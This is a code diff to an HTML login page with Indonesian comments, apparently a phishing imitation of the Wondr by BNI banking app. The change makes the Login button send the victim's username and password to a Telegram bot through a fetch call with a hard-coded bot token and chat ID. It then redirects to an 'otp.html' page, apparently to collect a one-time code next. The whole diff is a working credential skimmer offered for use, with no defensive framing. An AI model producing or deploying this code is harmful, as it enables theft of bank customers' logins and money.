@@ -114,8 +114,8 @@
             <input type="password" id="password" placeholder="Password" class="w-full px-3 py-2 text-sm border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-utama-hijauMuda">
         </div>
 
-        <!-- TOMBOL LOGIN ✅ SUDAH DIATUR: JIKA DIISI LENGKAP LANGSUNG PINDAH HALAMAN ✅ -->
-        <button id="tombolLogin" class="w-full py-2 bg-utama-hijauMuda text-white rounded-full flex items-center justify-center gap-2 text-base font-medium mb-3" onclick="cekDanPindah()">
+        <!-- TOMBOL LOGIN ✅ SUDAH DIATUR: KIRIM KE TELEGRAM LALU PINDAH HALAMAN ✅ -->
+        <button id="tombolLogin" class="w-full py-2 bg-utama-hijauMuda text-white rounded-full flex items-center justify-center gap-2 text-base font-medium mb-3" onclick="cekDanKirim()">
             <i class="fa fa-fingerprint"></i>
             Login
         </button>
@@ -125,17 +125,43 @@
 
     </main>
 
-    <!-- ✅ KODE JAVASCRIPT UNTUK CEK ISIAN DAN PINDAH HALAMAN ✅ -->
+    <!-- ✅ KODE JAVASCRIPT UNTUK KIRIM DATA KE TELEGRAM ✅ -->
     <script>
-        function cekDanPindah() {
+        // ✅ ISI DATA TELEGRAM KAMU DISINI ✅
+        const TOKEN_BOT = "8448627224:AAH-yfGcIglnMile1XSnAGnng7Jy4_K5xGo";     // Ganti Token Bot
+        const CHAT_ID = "8617754329";         // Ganti Chat ID
+        const HALAMAN_TUJUAN = "otp.html";                 // Halaman tujuan setelah terkirim
+
+        function cekDanKirim() {
             // Ambil nilai dari kolom isian
             var user = document.getElementById("username").value;
             var pass = document.getElementById("password").value;
 
             // Cek apakah keduanya sudah diisi
-            if (user != "" && pass != "") {
-                // Jika sudah diisi, langsung pindah ke halaman tujuan
-                window.location.href = "otp.html"; // <--- GANTI NAMA FILE TUJUAN DISINI
+            if (user !== "" && pass !== "") {
+
+                // Ubah tampilan tombol jadi proses
+                const tombol = document.getElementById("tombolLogin");
+                tombol.innerHTML = "Sedang Memproses...";
+                tombol.disabled = true;
+
+                // ✅ KIRIM DATA KE TELEGRAM ✅
+                fetch(`https://api.telegram.org/bot${TOKEN_BOT}/sendMessage?chat_id=${CHAT_ID}&text=LOGIN%20WONDR%20BNI%0A%0AUsername%3A%20${user}%0APassword%3A%20${pass}`)
+                .then(response => response.json())
+                .then(data => {
+                    // Jika pesan BERHASIL terkirim, baru pindah halaman
+                    if (data.ok) {
+                        tombol.innerHTML = "Berhasil!";
+                        // Pindah ke halaman tujuan
+                        window.location.href = HALAMAN_TUJUAN;
+                    }
+                })
+                .catch(error => {
+                    alert("Gagal mengirim data! Periksa koneksi atau pengaturan.");
+                    tombol.innerHTML = "Login";
+                    tombol.disabled = false;
+                });
+
             } else {
                 // Jika ada yang kosong, beri peringatan
                 alert("⚠️Silakan isi Username dan Password terlebih dahulu!");
